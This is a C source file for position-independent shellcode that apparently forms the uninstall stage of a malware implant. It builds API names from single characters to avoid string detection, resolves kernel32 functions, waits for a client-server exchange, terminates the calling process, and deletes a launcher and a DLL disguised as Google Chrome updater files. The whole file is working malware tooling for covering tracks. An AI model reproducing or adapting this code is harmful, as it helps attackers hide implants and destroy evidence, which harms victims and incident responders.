#include "pch.h"
#include "PIC.h"

#pragma runtime_checks( "", off )
#pragma optimize("", off)

#pragma code_seg(".text$AAAA")
DWORD
__declspec(safebuffers)
__declspec(noinline)
WINAPI PicStart(struct PicParams* params)
{
	//__debugbreak();
	pLoadLibraryA loadLibraryA = (pLoadLibraryA)(params->loadLibraryA);
	pGetProcAddress getProcAddress = (pGetProcAddress)params->getProcAddress;

	CHAR kernel32Dll[] = { 'k','e','r','n','e','l', '3', '2','.','d','l','l','\0' };

	// Function names
	CHAR sleepName[] = { 'S','l','e','e','p','\0' };
	CHAR openProcessName[] = { 'O','p','e','n','P','r','o','c','e','s','s','\0' };
	CHAR terminateProcessName[] = { 'T','e','r','m','i','n','a','t','e','P','r','o','c','e','s','s','\0' };
	CHAR closeHandleName[] = { 'C','l','o','s','e','H','a','n','d','l','e', '\0' };
	CHAR deleteFileAName[] = { 'D','e','l','e','t','e','F','i','l','e','A','\0' };

	// File paths
	CHAR launcherPath[] = { 'C',':','\\','P','r','o','g','r','a','m',' ','F','i','l','e','s','\\','G','o','o','g','l','e','\\' \
		,'C','h','r','o','m','e','\\','A','p','p','l','i','c','a','t','i','o','n','\\','G','o','o','g','l','e','U','p','d','a','t','e' \
		,'C','l','i','e','n','t','.','e','x','e','\0' };
	CHAR dllPath[] = { 'C',':','\\','P','r','o','g','r','a','m',' ','F','i','l','e','s','\\','G','o','o','g','l','e','\\' \
	,'C','h','r','o','m','e','\\','A','p','p','l','i','c','a','t','i','o','n','\\','e','v','e','n','t','l','o','g','_','p','r','o' \
	,'v','i','d','e','r','.','d','l','l','\0' };

	// Get function pointers
	HMODULE kernel32Module = loadLibraryA(kernel32Dll);
	pSleep sleep = (pSleep)getProcAddress(kernel32Module, sleepName);
	pOpenProcess openProcess = (pOpenProcess)getProcAddress(kernel32Module, openProcessName);
	pTerminateProcess terminateProcess = (pTerminateProcess)getProcAddress(kernel32Module, terminateProcessName);
	pCloseHandle closeHandle = (pCloseHandle)getProcAddress(kernel32Module, closeHandleName);
	pDeleteFileA deleteFileA = (pDeleteFileA)getProcAddress(kernel32Module, deleteFileAName);

	// Give the client time to send the server a response
	sleep(3000);

	// Terminate the calling process
	HANDLE hProcess = openProcess(PROCESS_TERMINATE, FALSE, params->pid);
	terminateProcess(hProcess, 1);
	closeHandle(hProcess);

	// Delete files from disk
	deleteFileA(launcherPath);
	deleteFileA(dllPath);

	return 0;
}

#pragma code_seg(".text$AAAB")
void PicEnd()
{
	// Left blank internationally
}

#pragma optimize("", on)
#pragma runtime_checks( "", restore)